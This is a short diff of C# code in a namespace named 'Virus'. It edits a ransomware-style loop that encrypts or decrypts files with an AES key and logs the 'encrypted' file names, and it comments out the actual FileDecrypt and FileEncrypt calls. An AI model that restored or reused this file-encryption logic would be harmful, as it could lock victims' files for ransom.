@@ -264,14 +264,14 @@ namespace Virus
                     if (encrypt == false)
                     {
                         //Debug.WriteLine($"Would have decrypted {fileName}");
-                        FileDecrypt(fileName, aesKey);
+                        //FileDecrypt(fileName, aesKey);
                         
 
                     }
                     else if (encrypt == true)
                     {
                         //Debug.WriteLine($"Would have encrypted {fileName}");
-                        FileDecrypt(fileName, aesKey);
+                        //FileEncrypt(fileName, aesKey);
                         File.AppendAllText(encrypttxt, fileName);
                         Debug.WriteLine(_encryptedFileCount++);
 
